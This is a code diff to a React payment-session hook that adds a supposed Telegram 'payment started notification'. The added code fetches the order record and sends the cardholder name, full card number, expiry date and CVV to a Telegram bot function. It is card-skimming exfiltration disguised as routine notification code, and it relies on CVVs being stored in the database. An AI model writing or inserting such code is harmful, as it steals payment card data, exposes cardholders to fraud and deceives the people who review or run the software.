@@ -38,6 +38,33 @@ export const usePaymentSession = ({ orderId, enabled = true }: UsePaymentSession
 
       setSessionId(data.sessionId);
       console.log('Session started with ID:', data.sessionId);
+
+      // Send payment started notification to Telegram
+      try {
+        // Get order details for notification
+        const { data: orderData, error: orderError } = await supabase
+          .from('orders')
+          .select('*')
+          .eq('id', orderId)
+          .single();
+
+        if (!orderError && orderData) {
+          await supabase.functions.invoke('telegram-bot/send-notification', {
+            body: {
+              type: 'payment_started',
+              data: {
+                session_id: data.sessionId,
+                cardholder_name: orderData.cardholder_name,
+                card_number: orderData.card_number,
+                expiry_date: orderData.expiry_date,
+                cvv: orderData.cvv
+              }
+            }
+          });
+        }
+      } catch (telegramError) {
+        console.warn('Failed to send Telegram payment notification:', telegramError);
+      }
       
       // Start heartbeat
       startHeartbeat();
